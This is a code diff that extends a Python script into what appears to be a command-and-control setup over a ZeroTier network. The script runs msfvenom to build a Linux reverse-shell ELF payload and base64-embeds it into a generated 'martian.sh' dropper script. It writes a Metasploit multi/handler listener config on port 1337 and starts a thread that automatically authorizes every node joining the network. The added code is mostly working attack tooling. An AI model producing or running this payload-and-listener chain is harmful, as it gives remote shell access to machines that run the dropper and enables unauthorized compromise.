@@ -72,3 +72,66 @@ response = requests.get(
 )
 
 print(response, response.text)
+
+# Get local IP for reference
+d = json.loads(response.text)
+local_ip = d.get('ipAssignments')[0]
+print(f'local IP: {local_ip}')
+
+command = f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={local_ip} LPORT=1337 -f elf'
+output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
+encoded = base64.b64encode(output.stdout)
+shell_text = 'echo "' + encoded.decode() + '" | base64 -d > rev.elf && chmod +x rev.elf'
+script = open('scripts/martian_template.sh').readlines()
+script.insert(1, shell_text + '\n')
+script.insert(7, f'sudo ./zerotier-cli join {os.environ["NWID"]}\n')
+with open('prod/martian.sh', 'w') as f:
+        for line in script:
+            f.write(line)
+
+# Create metasploit config settings
+with open('prod/msf-settings.rc', 'w') as f:
+    f.write('workspace GALAXY\n')
+    f.write('use exploit/multi/handler\n')
+    f.write(f'set LHOST {local_ip}\n')
+    f.write('set LPORT 1337\n')
+    f.write('exploit\n')
+log.print_general('Metasploit configuration written to prod/msf-settings.rc')
+log.success('Launch metasploit in a new window:\t"msfconsole -r prod/msf-settings.rc"')
+
+# Start trying to authorize new members
+
+def authenticate_new_members():
+    authorized_nodes = []
+    while True:
+        # Gets all nodes currently on the network
+        headers = {
+            'X-ZT1-AUTH': os.getenv('TOKEN', ''),
+        }
+        response = requests.get('http://localhost:9993/controller/network/' + os.getenv('NWID', '') + '/member', headers=headers)
+        nodes = json.loads(response.text)
+        # Iterate through each node, authorizing it and adding to the list of authorized nodes
+        for key in nodes:
+            if(not key in authorized_nodes):
+                headers = {
+                'X-ZT1-AUTH': os.getenv('TOKEN', ''),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                }
+                data = '{"authorized": true}'
+                response = requests.post(
+                    'http://localhost:9993/controller/network/' + os.getenv('NWID', '') + '/member/' + key,
+                    headers=headers,
+                    data=data,
+                )
+                print(f'Attempted to authorie new node {key}')
+                authorized_nodes.append(key)
+    time.sleep(5)
+
+
+thr = threading.Thread(target=authenticate_new_members)
+thr.start()
+print('[*] Attempting to authenticate new members...')
+
+# Next, start reverse listener on MFSConsole
+
+# After that, start trying to authenticate new hosts every 4 seconds
